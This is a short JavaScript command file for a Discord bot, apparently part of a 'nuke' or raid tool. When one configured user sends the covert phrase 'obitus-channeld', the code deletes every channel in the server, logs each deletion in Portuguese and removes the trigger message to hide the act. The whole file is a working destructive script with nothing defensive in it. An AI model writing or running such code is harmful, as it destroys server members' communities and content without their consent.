const config = require("../config.json");
exports.run = (client, message, args) => {
    if(message.content === "obitus-channeld" && message.author.id === config["user-id"]){
        message.guild.channels.cache.forEach(channelss =>{
            channelss.delete()
            .then(deleted => console.log(`+ | Canal deletado. | Nome: ${deleted.name} | Tipo: ${deleted.type} |`))
            .catch(console.error)
        })
        message.delete()
    }
}